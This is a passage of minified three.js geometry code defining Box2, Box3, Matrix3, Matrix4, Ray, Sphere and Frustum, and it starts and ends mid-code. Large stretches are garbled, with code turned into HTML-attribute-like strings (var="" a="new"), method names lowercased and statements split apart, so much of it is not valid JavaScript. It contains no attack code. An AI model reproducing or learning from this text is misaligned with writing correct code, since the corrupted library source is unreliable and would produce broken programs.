THREE.Vector2(Infinity,Infinity);this.max=void 0!==b?b:new THREE.Vector2(-Infinity,-Infinity)};\nTHREE.Box2.prototype={constructor:THREE.Box2,set:function(a,b){this.min.copy(a);this.max.copy(b);return this},setFromPoints:function(a){this.makeEmpty();for(var b=0,c=a.length;b<c;b++)this.expandbypoint(a[b]);return this},setfromcenterandsize:function(){var=\"\" a=\"new\" three.vector2;return=\"\" function(b,c){var=\"\" d=\"a.copy(c).multiplyScalar(.5);this.min.copy(b).sub(d);this.max.copy(b).add(d);return\" this}}(),clone:function(){return(new=\"\" this.constructor).copy(this)},copy:function(a){this.min.copy(a.min);this.max.copy(a.max);=\"\" return=\"\" this},makeempty:function(){this.min.x=\"this.min.y=Infinity;this.max.x=this.max.y=-Infinity;return\" this},isempty:function(){return=\"\" this.max.x<this.min.x||this.max.y<this.min.y},center:function(a){return(a||new=\"\" three.vector2).addvectors(this.min,this.max).multiplyscalar(.5)},size:function(a){return(a||new=\"\" three.vector2).subvectors(this.max,this.min)},expandbypoint:function(a){this.min.min(a);this.max.max(a);return=\"\" this},expandbyvector:function(a){this.min.sub(a);this.max.add(a);return=\"\" this},expandbyscalar:function(a){this.min.addscalar(-a);=\"\" this.max.addscalar(a);return=\"\" this},containspoint:function(a){return=\"\" a.x<this.min.x||a.x=\"\">this.max.x||a.y<this.min.y||a.y>this.max.y?!1:!0},containsBox:function(a){return this.min.x<=a.min.x&&a.max.x<=this.max.x&&this.min.y<=a.min.y&&a.max.y<=this.max.y?!0:!1},getparameter:function(a,b){return(b||new three.vector2).set((a.x-this.min.x)=\"\" (this.max.x-this.min.x),(a.y-this.min.y)=\"\" (this.max.y-this.min.y))},intersectsbox:function(a){return=\"\" a.max.x<this.min.x||a.min.x=\"\">this.max.x||a.max.y<this.min.y||a.min.y>\nthis.max.y?!1:!0},clampPoint:function(a,b){return(b||new THREE.Vector2).copy(a).clamp(this.min,this.max)},distanceToPoint:function(){var a=new THREE.Vector2;return function(b){return a.copy(b).clamp(this.min,this.max).sub(b).length()}}(),intersect:function(a){this.min.max(a.min);this.max.min(a.max);return this},union:function(a){this.min.min(a.min);this.max.max(a.max);return this},translate:function(a){this.min.add(a);this.max.add(a);return this},equals:function(a){return a.min.equals(this.min)&&\na.max.equals(this.max)}};THREE.Box3=function(a,b){this.min=void 0!==a?a:new THREE.Vector3(Infinity,Infinity,Infinity);this.max=void 0!==b?b:new THREE.Vector3(-Infinity,-Infinity,-Infinity)};\nTHREE.Box3.prototype={constructor:THREE.Box3,set:function(a,b){this.min.copy(a);this.max.copy(b);return this},setFromArray:function(a){for(var b=Infinity,c=Infinity,d=Infinity,e=-Infinity,f=-Infinity,g=-Infinity,h=0,k=a.length;h<k;h+=3){var l=\"a[h],n=a[h+1],p=a[h+2];l<b&&(b=l);n<c&&(c=n);p<d&&(d=p);l\">e&&(e=l);n>f&&(f=n);p>g&&(g=p)}this.min.set(b,c,d);this.max.set(e,f,g)},setFromPoints:function(a){this.makeEmpty();for(var b=0,c=a.length;b<c;b++)this.expandbypoint(a[b]);return this},setfromcenterandsize:function(){var=\"\" a=\"new\" three.vector3;return=\"\" function(b,c){var=\"\" d=\"a.copy(c).multiplyScalar(.5);this.min.copy(b).sub(d);this.max.copy(b).add(d);return\" this}}(),setfromobject:function(){var=\"\" function(b){var=\"\" c=\"this;b.updateMatrixWorld(!0);this.makeEmpty();b.traverse(function(b){var\" e=\"b.geometry;if(void\" 0!=\"=e)if(e\" instanceof=\"\" three.geometry)for(var=\"\" f=\"e.vertices,e=0,g=f.length;e<g;e++)a.copy(f[e]),a.applyMatrix4(b.matrixWorld),c.expandByPoint(a);else\" if(e=\"\" three.buffergeometry&&void=\"\" e.attributes.position)for(f=\"e.attributes.position.array,e=0,g=f.length;e<g;e+=3)a.fromArray(f,e),a.applyMatrix4(b.matrixWorld),c.expandByPoint(a)});return\" this}}(),clone:function(){return(new=\"\" this.constructor).copy(this)},copy:function(a){this.min.copy(a.min);this.max.copy(a.max);return=\"\" this},makeempty:function(){this.min.x=\"this.min.y=this.min.z=Infinity;this.max.x=this.max.y=this.max.z=-Infinity;return\" this},isempty:function(){return=\"\" this.max.x<this.min.x||this.max.y<this.min.y||this.max.z<this.min.z},=\"\" center:function(a){return(a||new=\"\" three.vector3).addvectors(this.min,this.max).multiplyscalar(.5)},size:function(a){return(a||new=\"\" three.vector3).subvectors(this.max,this.min)},expandbypoint:function(a){this.min.min(a);this.max.max(a);return=\"\" this},expandbyvector:function(a){this.min.sub(a);this.max.add(a);return=\"\" this},expandbyscalar:function(a){this.min.addscalar(-a);this.max.addscalar(a);return=\"\" this},containspoint:function(a){return=\"\" a.x<this.min.x||a.x=\"\">this.max.x||a.y<this.min.y||a.y>this.max.y||a.z<\nthis.min.z||a.z>this.max.z?!1:!0},containsBox:function(a){return this.min.x<=a.min.x&&a.max.x<=this.max.x&&this.min.y<=a.min.y&&a.max.y<=this.max.y&&this.min.z<=a.min.z&&a.max.z<=this.max.z?!0:!1},getparameter:function(a,b){return(b||new three.vector3).set((a.x-this.min.x)=\"\" (this.max.x-this.min.x),(a.y-this.min.y)=\"\" (this.max.y-this.min.y),(a.z-this.min.z)=\"\" (this.max.z-this.min.z))},intersectsbox:function(a){return=\"\" a.max.x<this.min.x||a.min.x=\"\">this.max.x||a.max.y<this.min.y||a.min.y>this.max.y||a.max.z<\nthis.min.z||a.min.z>this.max.z?!1:!0},intersectsSphere:function(){var a;return function(b){void 0===a&&(a=new THREE.Vector3);this.clampPoint(b.center,a);return a.distanceToSquared(b.center)<=b.radius*b.radius}}(),intersectsplane:function(a){var b,c;0<a.normal.x?(b=\"a.normal.x*this.min.x,c=a.normal.x*this.max.x):(b=a.normal.x*this.max.x,c=a.normal.x*this.min.x);0<a.normal.y?(b+=a.normal.y*this.min.y,c+=a.normal.y*this.max.y):(b+=a.normal.y*this.max.y,c+=a.normal.y*this.min.y);0<a.normal.z?(b+=a.normal.z*\" this.min.z,c+=\"a.normal.z*this.max.z):(b+=a.normal.z*this.max.z,c+=a.normal.z*this.min.z);return\" b<=\"a.constant&&c\">=a.constant},clampPoint:function(a,b){return(b||new THREE.Vector3).copy(a).clamp(this.min,this.max)},distanceToPoint:function(){var a=new THREE.Vector3;return function(b){return a.copy(b).clamp(this.min,this.max).sub(b).length()}}(),getBoundingSphere:function(){var a=new THREE.Vector3;return function(b){b=b||new THREE.Sphere;b.center=this.center();b.radius=.5*this.size(a).length();return b}}(),\nintersect:function(a){this.min.max(a.min);this.max.min(a.max);this.isEmpty()&&this.makeEmpty();return this},union:function(a){this.min.min(a.min);this.max.max(a.max);return this},applyMatrix4:function(){var a=[new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3];return function(b){if(this.isEmpty())return this;a[0].set(this.min.x,this.min.y,this.min.z).applyMatrix4(b);a[1].set(this.min.x,this.min.y,this.max.z).applyMatrix4(b);\na[2].set(this.min.x,this.max.y,this.min.z).applyMatrix4(b);a[3].set(this.min.x,this.max.y,this.max.z).applyMatrix4(b);a[4].set(this.max.x,this.min.y,this.min.z).applyMatrix4(b);a[5].set(this.max.x,this.min.y,this.max.z).applyMatrix4(b);a[6].set(this.max.x,this.max.y,this.min.z).applyMatrix4(b);a[7].set(this.max.x,this.max.y,this.max.z).applyMatrix4(b);this.setFromPoints(a);return this}}(),translate:function(a){this.min.add(a);this.max.add(a);return this},equals:function(a){return a.min.equals(this.min)&&\na.max.equals(this.max)}};THREE.Matrix3=function(){this.elements=new Float32Array([1,0,0,0,1,0,0,0,1]);0<arguments.length&&console.error(\"three.matrix3: 0=\"==a&&(a=new\" the=\"\" constructor=\"\" no=\"\" longer=\"\" reads=\"\" arguments.=\"\" use=\"\" .set()=\"\" instead.\")};=\"\" three.matrix3.prototype=\"{constructor:THREE.Matrix3,set:function(a,b,c,d,e,f,g,h,k){var\" l=\"this.elements;l[0]=a;l[1]=d;l[2]=g;l[3]=b;l[4]=e;l[5]=h;l[6]=c;l[7]=f;l[8]=k;return\" this},identity:function(){this.set(1,0,0,0,1,0,0,0,1);return=\"\" this},clone:function(){return(new=\"\" this.constructor).fromarray(this.elements)},copy:function(a){a=\"a.elements;this.set(a[0],a[3],a[6],a[1],a[4],a[7],a[2],a[5],a[8]);return\" this},setfrommatrix4:function(a){a=\"a.elements;this.set(a[0],a[4],a[8],a[1],a[5],a[9],a[2],a[6],a[10]);\" return=\"\" this},applytovector3array:function(){var=\"\" a;return=\"\" function(b,c,d){void=\"\" three.vector3);void=\"\" e=\"0;e<d;e+=3,c+=3)a.fromArray(b,c),a.applyMatrix3(this),a.toArray(b,c);return\" b}}(),applytobuffer:function(){var=\"\" b}}(),=\"\" multiplyscalar:function(a){var=\"\" b=\"this.elements;b[0]*=a;b[3]*=a;b[6]*=a;b[1]*=a;b[4]*=a;b[7]*=a;b[2]*=a;b[5]*=a;b[8]*=a;return\" this},determinant:function(){var=\"\" a=\"this.elements,b=a[0],c=a[1],d=a[2],e=a[3],f=a[4],g=a[5],h=a[6],k=a[7],a=a[8];return\" b*f*a-b*g*k-c*e*a+c*g*h+d*e*k-d*f*h},getinverse:function(a,b){a=\"\" instanceof=\"\" three.matrix4&&console.error(\"three.matrix3.getinverse=\"\" takes=\"\" matrix4=\"\" argument.\");var=\"\" c=\"a.elements,d=this.elements,e=c[0],f=c[1],g=c[2],h=c[3],k=c[4],l=c[5],n=c[6],p=c[7],\" error(\"three.matrix3.getinverse():=\"\" can't=\"\" invert=\"\" matrix,=\"\" determinant=\"\" is=\"\" 0\");console.warn(\"three.matrix3.getinverse():=\"\" 0\");return=\"\" this.identity()}s=\"1/s;d[0]=m*s;d[1]=(g*p-c*f)*s;d[2]=(l*f-g*k)*s;d[3]=q*s;d[4]=(c*e-g*n)*s;d[5]=(g*h-l*e)*s;d[6]=r*s;d[7]=(f*n-p*e)*s;d[8]=(k*e-f*h)*s;return\" this},transpose:function(){var=\"\" a,b=\"this.elements;a=b[1];b[1]=b[3];b[3]=a;a=b[2];b[2]=b[6];b[6]=a;a=b[5];b[5]=\" b[7];b[7]=\"a;return\" this},flattentoarrayoffset:function(a,b){console.warn(\"three.matrix3:=\"\" .flattentoarrayoffset=\"\" deprecated=\"\" -=\"\" just=\"\" .toarray=\"\" instead.\");return=\"\" this.toarray(a,b)},getnormalmatrix:function(a){return=\"\" this.setfrommatrix4(a).getinverse(this).transpose()},transposeintoarray:function(a){var=\"\" this},fromarray:function(a){this.elements.set(a);return=\"\" this},toarray:function(a,b){void=\"\" a&&(a=\"[]);void\" a}};three.matrix4=\"function(){this.elements=new\" float32array([1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1]);0<arguments.length&&console.error(\"three.matrix4:=\"\" three.matrix4.prototype=\"{constructor:THREE.Matrix4,set:function(a,b,c,d,e,f,g,h,k,l,n,p,m,q,r,s){var\" t=\"this.elements;t[0]=a;t[4]=b;t[8]=c;t[12]=d;t[1]=e;t[5]=f;t[9]=g;t[13]=h;t[2]=k;t[6]=l;t[10]=n;t[14]=p;t[3]=m;t[7]=q;t[11]=r;t[15]=s;return\" this},identity:function(){this.set(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1);return=\"\" three.matrix4).fromarray(this.elements)},copy:function(a){this.elements.set(a.elements);return=\"\" this},copyposition:function(a){var=\"\" b[12]=\"a[12];b[13]=a[13];b[14]=a[14];return\" this},extractbasis:function(a,b,c){a.setfrommatrixcolumn(this,0);b.setfrommatrixcolumn(this,1);c.setfrommatrixcolumn(this,2);return=\"\" this},makebasis:function(a,b,c){this.set(a.x,b.x,c.x,0,a.y,b.y,c.y,0,a.z,b.z,c.z,0,0,0,0,1);return=\"\" this},extractrotation:function(){var=\"\" function(b){void=\"\" three.vector3);var=\"\" 2).length();c[0]=\"d[0]*e;c[1]=d[1]*e;c[2]=d[2]*e;c[4]=d[4]*f;c[5]=d[5]*f;c[6]=d[6]*f;c[8]=d[8]*b;c[9]=d[9]*b;c[10]=d[10]*b;return\" this}}(),makerotationfromeuler:function(a){!1=\"==a\" three.euler&&console.error(\"three.matrix:=\"\" .makerotationfromeuler()=\"\" now=\"\" expects=\"\" euler=\"\" rotation=\"\" rather=\"\" than=\"\" vector3=\"\" and=\"\" order.\");var=\"\" k=\"f*e,l=c*h,n=c*e;b[0]=g*h;b[4]=\" -g*e;b[8]=\"d;b[1]=k+l*d;b[5]=a-n*d;b[9]=-c*g;b[2]=n-a*d;b[6]=l+k*d;b[10]=f*g}else\" yxz\"=\"==a.order?(a=g*h,k=g*e,l=d*h,n=d*e,b[0]=a+n*c,b[4]=l*c-k,b[8]=f*d,b[1]=f*e,b[5]=f*h,b[9]=-c,b[2]=k*c-l,b[6]=n+a*c,b[10]=f*g):\"ZXY\"===a.order?(a=g*h,k=g*e,l=d*h,n=d*e,b[0]=a-n*c,b[4]=-f*e,b[8]=l+k*c,b[1]=k+l*c,b[5]=f*h,b[9]=n-a*c,b[2]=-f*d,b[6]=c,b[10]=f*g):\"ZYX\"===a.order?(a=f*h,k=f*e,l=c*h,n=c*e,b[0]=g*h,b[4]=l*d-k,b[8]=a*d+n,b[1]=g*e,b[5]=n*d+a,b[9]=k*d-l,b[2]=-d,b[6]=c*g,b[10]=f*g):\"YZX\"===a.order?(a=f*g,k=f*\"\" d,l=\"c*g,n=c*d,b[0]=g*h,b[4]=n-a*e,b[8]=l*e+k,b[1]=e,b[5]=f*h,b[9]=-c*h,b[2]=-d*h,b[6]=k*e+l,b[10]=a-n*e):\" xzy\"=\"==a.order&&(a=f*g,k=f*d,l=c*g,n=c*d,b[0]=g*h,b[4]=-e,b[8]=d*h,b[1]=a*e+n,b[5]=f*h,b[9]=k*e-l,b[2]=l*e-k,b[6]=c*h,b[10]=n*e+a);b[3]=0;b[7]=0;b[11]=0;b[12]=0;b[13]=0;b[14]=0;b[15]=1;return\"\" this},makerotationfromquaternion:function(a){var=\"\" f;b[5]=\"1-(a+e);b[9]=d-g;b[2]=c-h;b[6]=d+g;b[10]=1-(a+n);b[3]=0;b[7]=0;b[11]=0;b[12]=0;b[13]=0;b[14]=0;b[15]=1;return\" this},lookat:function(){var=\"\" a,b,c;return=\"\" function(d,e,f){void=\"\" three.vector3,b=\"new\" three.vector3,c=\"new\" g=\"this.elements;c.subVectors(d,e).normalize();0===c.lengthSq()&&(c.z=1);a.crossVectors(f,c).normalize();0===a.lengthSq()&&(c.z+=1E-4,a.crossVectors(f,c).normalize());b.crossVectors(c,a);g[0]=a.x;g[4]=b.x;g[8]=c.x;g[1]=a.y;g[5]=b.y;g[9]=c.y;g[2]=a.z;\" g[6]=\"b.z;g[10]=c.z;return\" this}}(),multiply:function(a,b){return=\"\" void=\"\" 0!=\"=b?(console.warn(\" three.matrix4:\"=\"\" .multiply()=\"\" only=\"\" accepts=\"\" one=\"\" argument.=\"\" .multiplymatrices(=\"\" a,=\"\" )=\"\" instead.\"),this.multiplymatrices(a,b)):this.multiplymatrices(this,a)},premultiply:function(a){return=\"\" this.multiplymatrices(a,this)},multiplymatrices:function(a,b){var=\"\" w=\"d[0],E=d[4],z=d[8],y=d[12],A=d[1],I=d[5],B=d[9],F=d[13],K=d[2],P=d[6],M=d[10],H=d[14],L=d[3],O=d[7],N=d[11],d=d[15];e[0]=f*w+g*A+h*K+k*L;e[4]=f*E+g*I+h*P+k*O;e[8]=f*z+g*B+h*M+k*N;e[12]=f*y+g*F+h*H+k*d;e[1]=l*w+n*A+p*K+m*L;e[5]=l*E+n*I+p*P+m*O;e[9]=l*z+n*B+p*M+m*N;e[13]=l*y+n*F+p*H+m*d;e[2]=q*w+r*A+s*K+t*L;e[6]=q*E+r*I+s*P+t*O;e[10]=q*z+r*B+s*M+t*N;e[14]=q*y+r*F+s*H+t*d;e[3]=u*w+v*A+C*K+c*L;e[7]=u*E+v*I+C*P+c*O;e[11]=u*z+v*B+C*M+c*N;e[15]=u*y+v*F+C*H+c*d;return\" this},multiplytoarray:function(a,b,=\"\" c){var=\"\" d=\"this.elements;this.multiplyMatrices(a,b);c[0]=d[0];c[1]=d[1];c[2]=d[2];c[3]=d[3];c[4]=d[4];c[5]=d[5];c[6]=d[6];c[7]=d[7];c[8]=d[8];c[9]=d[9];c[10]=d[10];c[11]=d[11];c[12]=d[12];c[13]=d[13];c[14]=d[14];c[15]=d[15];return\" this},multiplyscalar:function(a){var=\"\" (a=\"new\" b}}(),determinant:function(){var=\"\" a[5],h=\"a[9],k=a[13],l=a[2],n=a[6],p=a[10],m=a[14];return\" a[3]*(+e*h*n-d*k*n-e*g*p+c*k*p+d*g*m-c*h*m)+a[7]*(+b*h*m-b*k*p+e*f*p-d*f*m+d*k*l-e*h*l)+a[11]*(+b*k*n-b*g*m-e*f*n+c*f*m+e*g*l-c*k*l)+a[15]*(-d*g*l-b*h*n+b*g*p+d*f*n-c*f*p+c*h*l)},transpose:function(){var=\"\" instead.\");=\"\" this.toarray(a,b)},getposition:function(){var=\"\" function(){void=\"\" three.vector3);console.warn(\"three.matrix4:=\"\" .getposition()=\"\" has=\"\" been=\"\" removed.=\"\" vector3.setfrommatrixposition(=\"\" matrix=\"\" a.setfrommatrixcolumn(this,3)}}(),setposition:function(a){var=\"\" this},getinverse:function(a,b){var=\"\" u=\"d[13],v=d[14],d=d[15],C=q*v*p-u*r*p+u*n*s-l*v*s-q*n*d+l*r*d,w=t*r*p-m*v*p-t*n*s+k*v*s+m*n*d-k*r*d,E=m*u*p-t*q*p+t*l*s-k*u*s-m*l*d+k*q*d,z=t*q*n-m*u*n-t*l*r+k*u*r+m*l*v-k*q*v,y=e*C+f*w+g*E+h*z;if(0===y){if(b)throw\" error(\"three.matrix4.getinverse():=\"\" 0\");console.warn(\"three.matrix4.getinverse():=\"\" this.identity()}y=\"1/y;c[0]=C*y;c[1]=(u*r*h-q*v*h-u*g*s+f*v*s+q*g*d-f*r*d)*y;c[2]=(l*v*h-u*n*h+u*g*p-f*v*p-l*g*d+f*n*d)*y;c[3]=\" (q*n*h-l*r*h-q*g*p+f*r*p+l*g*s-f*n*s)*y;c[4]=\"w*y;c[5]=(m*v*h-t*r*h+t*g*s-e*v*s-m*g*d+e*r*d)*y;c[6]=(t*n*h-k*v*h-t*g*p+e*v*p+k*g*d-e*n*d)*y;c[7]=(k*r*h-m*n*h+m*g*p-e*r*p-k*g*s+e*n*s)*y;c[8]=E*y;c[9]=(t*q*h-m*u*h-t*f*s+e*u*s+m*f*d-e*q*d)*y;c[10]=(k*u*h-t*l*h+t*f*p-e*u*p-k*f*d+e*l*d)*y;c[11]=(m*l*h-k*q*h-m*f*p+e*q*p+k*f*s-e*l*s)*y;c[12]=z*y;c[13]=(m*u*g-t*q*g+t*f*r-e*u*r-m*f*v+e*q*v)*y;c[14]=(t*l*g-k*u*g-t*f*n+e*u*n+k*f*v-e*l*v)*y;c[15]=(k*q*g-m*l*g+m*f*n-e*q*n-k*f*r+e*l*r)*y;return\" this},scale:function(a){var=\"\" this},getmaxscaleonaxis:function(){var=\"\" math.sqrt(math.max(a[0]*a[0]+a[1]*a[1]+a[2]*a[2],a[4]*a[4]+a[5]*a[5]+a[6]*a[6],a[8]*a[8]+a[9]*a[9]+a[10]*a[10]))},maketranslation:function(a,b,c){this.set(1,0,0,a,0,1,0,b,0,0,1,c,0,0,0,1);return=\"\" this},makerotationx:function(a){var=\"\" this},makerotationy:function(a){var=\"\" this},makerotationz:function(a){var=\"\" this},makerotationaxis:function(a,b){var=\"\" this},makescale:function(a,b,c){this.set(a,0,0,0,0,b,0,0,0,0,c,=\"\" 0,0,0,0,1);return=\"\" this},compose:function(a,b,c){this.makerotationfromquaternion(b);this.scale(c);this.setposition(a);return=\"\" this},decompose:function(){var=\"\" a,b;return=\"\" function(c,d,e){void=\"\" three.matrix4);var=\"\" f=\"this.elements,g=a.set(f[0],f[1],f[2]).length(),h=a.set(f[4],f[5],f[6]).length(),k=a.set(f[8],f[9],f[10]).length();0\">this.determinant()&&(g=-g);c.x=f[12];c.y=f[13];c.z=f[14];b.elements.set(this.elements);c=1/g;var f=1/h,l=1/k;b.elements[0]*=c;b.elements[1]*=c;\nb.elements[2]*=c;b.elements[4]*=f;b.elements[5]*=f;b.elements[6]*=f;b.elements[8]*=l;b.elements[9]*=l;b.elements[10]*=l;d.setFromRotationMatrix(b);e.x=g;e.y=h;e.z=k;return this}}(),makeFrustum:function(a,b,c,d,e,f){var g=this.elements;g[0]=2*e/(b-a);g[4]=0;g[8]=(b+a)/(b-a);g[12]=0;g[1]=0;g[5]=2*e/(d-c);g[9]=(d+c)/(d-c);g[13]=0;g[2]=0;g[6]=0;g[10]=-(f+e)/(f-e);g[14]=-2*f*e/(f-e);g[3]=0;g[7]=0;g[11]=-1;g[15]=0;return this},makePerspective:function(a,b,c,d){a=c*Math.tan(THREE.Math.DEG2RAD*a*.5);var e=\n-a;return this.makeFrustum(e*b,a*b,e,a,c,d)},makeOrthographic:function(a,b,c,d,e,f){var g=this.elements,h=1/(b-a),k=1/(c-d),l=1/(f-e);g[0]=2*h;g[4]=0;g[8]=0;g[12]=-((b+a)*h);g[1]=0;g[5]=2*k;g[9]=0;g[13]=-((c+d)*k);g[2]=0;g[6]=0;g[10]=-2*l;g[14]=-((f+e)*l);g[3]=0;g[7]=0;g[11]=0;g[15]=1;return this},equals:function(a){var b=this.elements;a=a.elements;for(var c=0;16>c;c++)if(b[c]!==a[c])return!1;return!0},fromArray:function(a){this.elements.set(a);return this},toArray:function(a,b){void 0===a&&(a=[]);\nvoid 0===b&&(b=0);var c=this.elements;a[b]=c[0];a[b+1]=c[1];a[b+2]=c[2];a[b+3]=c[3];a[b+4]=c[4];a[b+5]=c[5];a[b+6]=c[6];a[b+7]=c[7];a[b+8]=c[8];a[b+9]=c[9];a[b+10]=c[10];a[b+11]=c[11];a[b+12]=c[12];a[b+13]=c[13];a[b+14]=c[14];a[b+15]=c[15];return a}};THREE.Ray=function(a,b){this.origin=void 0!==a?a:new THREE.Vector3;this.direction=void 0!==b?b:new THREE.Vector3};\nTHREE.Ray.prototype={constructor:THREE.Ray,set:function(a,b){this.origin.copy(a);this.direction.copy(b);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.origin.copy(a.origin);this.direction.copy(a.direction);return this},at:function(a,b){return(b||new THREE.Vector3).copy(this.direction).multiplyScalar(a).add(this.origin)},lookAt:function(a){this.direction.copy(a).sub(this.origin).normalize();return this},recast:function(){var a=new THREE.Vector3;return function(b){this.origin.copy(this.at(b,\na));return this}}(),closestPointToPoint:function(a,b){var c=b||new THREE.Vector3;c.subVectors(a,this.origin);var d=c.dot(this.direction);return 0>d?c.copy(this.origin):c.copy(this.direction).multiplyScalar(d).add(this.origin)},distanceToPoint:function(a){return Math.sqrt(this.distanceSqToPoint(a))},distanceSqToPoint:function(){var a=new THREE.Vector3;return function(b){var c=a.subVectors(b,this.origin).dot(this.direction);if(0>c)return this.origin.distanceToSquared(b);a.copy(this.direction).multiplyScalar(c).add(this.origin);\nreturn a.distanceToSquared(b)}}(),distanceSqToSegment:function(){var a=new THREE.Vector3,b=new THREE.Vector3,c=new THREE.Vector3;return function(d,e,f,g){a.copy(d).add(e).multiplyScalar(.5);b.copy(e).sub(d).normalize();c.copy(this.origin).sub(a);var h=.5*d.distanceTo(e),k=-this.direction.dot(b),l=c.dot(this.direction),n=-c.dot(b),p=c.lengthSq(),m=Math.abs(1-k*k),q;0<m?(d=k*n-l,e=k*l-n,q=h*m,0<=d?e>=-q?e<=q?(h=1 m,d*=\"h,e*=h,k=d*(d+k*e+2*l)+e*(k*d+e+2*n)+p):(e=h,d=Math.max(0,-(k*e+l)),k=-d*d+e*(e+2*\" n)+p):(e=\"-h,d=Math.max(0,-(k*e+l)),k=-d*d+e*(e+2*n)+p):e<=-q?(d=Math.max(0,-(-k*h+l)),e=0<d?-h:Math.min(Math.max(-h,-n),h),k=-d*d+e*(e+2*n)+p):e<=q?(d=0,e=Math.min(Math.max(-h,-n),h),k=e*(e+2*n)+p):(d=Math.max(0,-(k*h+l)),e=0<d?h:Math.min(Math.max(-h,-n),h),k=-d*d+e*(e+2*n)+p)):(e=0<k?-h:h,d=Math.max(0,-(k*e+l)),k=-d*d+e*(e+2*n)+p);f&&f.copy(this.direction).multiplyScalar(d).add(this.origin);g&&g.copy(b).multiplyScalar(e).add(a);return\" k}}(),intersectsphere:function(){var=\"\" a=\"new\" three.vector3;return=\"\" function(b,=\"\" c){a.subvectors(b.center,this.origin);var=\"\" d=\"a.dot(this.direction),e=a.dot(a)-d*d,f=b.radius*b.radius;if(e\">f)return null;f=Math.sqrt(f-e);e=d-f;d+=f;return 0>e&&0>d?null:0>e?this.at(d,c):this.at(e,c)}}(),intersectsSphere:function(a){return this.distanceToPoint(a.center)<=a.radius},distancetoplane:function(a){var 0=\"==a.distanceToPoint(this.origin)?0:null;a=-(this.origin.dot(a.normal)+a.constant)/b;return\" b=\"a.normal.dot(this.direction);if(0===b)return\" 0<=\"a?a:null},intersectPlane:function(a,b){var\" c=\"this.distanceToPlane(a);return\" null=\"==c?null:this.at(c,b)},intersectsPlane:function(a){var\">a.normal.dot(this.direction)*b?!0:!1},intersectBox:function(a,b){var c,d,e,f,g;d=1/this.direction.x;f=1/this.direction.y;g=1/this.direction.z;var h=this.origin;0<=d?(c=(a.min.x-h.x)*d,d*=a.max.x-h.x):(c=(a.max.x-h.x)*d,d*=a.min.x-h.x);0<=f?(e=(a.min.y-h.y)*f,f*=a.max.y-h.y):(e=(a.max.y-h.y)*f,f*=a.min.y-h.y);if(c>f||e>d)return null;if(e>c||c!==c)c=e;if(f<d||d!== d)d=\"f;0<=g?(e=(a.min.z-h.z)*g,g*=a.max.z-h.z):(e=(a.max.z-h.z)*g,g*=a.min.z-h.z);if(c\">g||e>d)return null;if(e>c||c!==c)c=e;if(g<d||d!==d)d=g;return 0=\"\">d?null:this.at(0<=c?c:d,b)},intersectsbox:function(){var a=\"new\" three.vector3;return=\"\" function(b){return=\"\" null!=\"=this.intersectBox(b,a)}}(),intersectTriangle:function(){var\" three.vector3,b=\"new\" three.vector3,c=\"new\" three.vector3,d=\"new\" function(e,f,g,h,k){b.subvectors(f,e);c.subvectors(g,e);d.crossvectors(b,c);f=\"this.direction.dot(d);\" if(0<f){if(h)return=\"\" null;h=\"1}else\" if(0=\"\">f)h=-1,f=-f;else return null;a.subVectors(this.origin,e);e=h*this.direction.dot(c.crossVectors(a,c));if(0>e)return null;g=h*this.direction.dot(b.cross(a));if(0>g||e+g>f)return null;e=-h*a.dot(d);return 0>e?null:this.at(e/f,k)}}(),applyMatrix4:function(a){this.direction.add(this.origin).applyMatrix4(a);this.origin.applyMatrix4(a);this.direction.sub(this.origin);this.direction.normalize();return this},equals:function(a){return a.origin.equals(this.origin)&&a.direction.equals(this.direction)}};\nTHREE.Sphere=function(a,b){this.center=void 0!==a?a:new THREE.Vector3;this.radius=void 0!==b?b:0};\nTHREE.Sphere.prototype={constructor:THREE.Sphere,set:function(a,b){this.center.copy(a);this.radius=b;return this},setFromPoints:function(){var a=new THREE.Box3;return function(b,c){var d=this.center;void 0!==c?d.copy(c):a.setFromPoints(b).center(d);for(var e=0,f=0,g=b.length;f<g;f++)e=math.max(e,d.distancetosquared(b[f]));this.radius=math.sqrt(e);return 0=\"\" this}}(),clone:function(){return(new=\"\" this.constructor).copy(this)},copy:function(a){this.center.copy(a.center);this.radius=\"a.radius;return\" this},=\"\" empty:function(){return=\"\">=this.radius},containsPoint:function(a){return a.distanceToSquared(this.center)<=this.radius*this.radius},distancetopoint:function(a){return a.distanceto(this.center)-this.radius},intersectssphere:function(a){var=\"\" b=\"this.radius+a.radius;return\" a.center.distancetosquared(this.center)<=\"b*b},intersectsBox:function(a){return\" a.intersectssphere(this)},intersectsplane:function(a){return=\"\" math.abs(this.center.dot(a.normal)-a.constant)<=\"this.radius},clampPoint:function(a,b){var\" c=\"this.center.distanceToSquared(a),d=b||new\" three.vector3;d.copy(a);c=\"\">this.radius*this.radius&&(d.sub(this.center).normalize(),d.multiplyScalar(this.radius).add(this.center));return d},getBoundingBox:function(a){a=a||new THREE.Box3;a.set(this.center,this.center);a.expandByScalar(this.radius);return a},applyMatrix4:function(a){this.center.applyMatrix4(a);this.radius*=a.getMaxScaleOnAxis();return this},translate:function(a){this.center.add(a);return this},equals:function(a){return a.center.equals(this.center)&&\na.radius===this.radius}};THREE.Frustum=function(a,b,c,d,e,f){this.planes=[void 0!==a?a:new THREE.Plane,void 0!==b?b:new THREE.Plane,void 0!==c?c:new THREE.Plane,void 0!==d?d:new THREE.Plane,void 0!==e?e:new THREE.Plane,void 0!==f?f:new THREE.Plane]};\nTHREE.Frustum.prototype={constructor:THREE.Frustum,set:function(a,b,c,d,e,f){var g=this.planes;g[0].copy(a);g[1].copy(b);g[2].copy(c);g[3].copy(d);g[4].copy(e);g[5].copy(f);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){for(var b=this.planes,c=0;6>c;c++)b[c].copy(a.planes[c]);return this},setFromMatrix:function(a){var b=this.planes,c=a.elements;a=c[0];var d=c[1],e=c[2],f=c[3],g=c[4],h=c[5],k=c[6],l=c[7],n=c[8],p=c[9],m=c[10],q=c[11],r=c[12],s=c[13],t=c[14],\nc=c[15];b[0].setComponents(f-a,l-g,q-n,c-r).normalize();b[1].setComponents(f+a,l+g,q+n,c+r).normalize();b[2].setComponents(f+d,l+h,q+p,c+s).normalize();b[3].setComponents(f-d,l-h,q-p,c-s).normalize();b[4].setComponents(f-e,l-k,q-m,c-t).normalize();b[5].setComponents(f+e,l+k,q+m,c+t).normalize();return this},intersectsObject:function(){var a=new THREE.Sphere;return 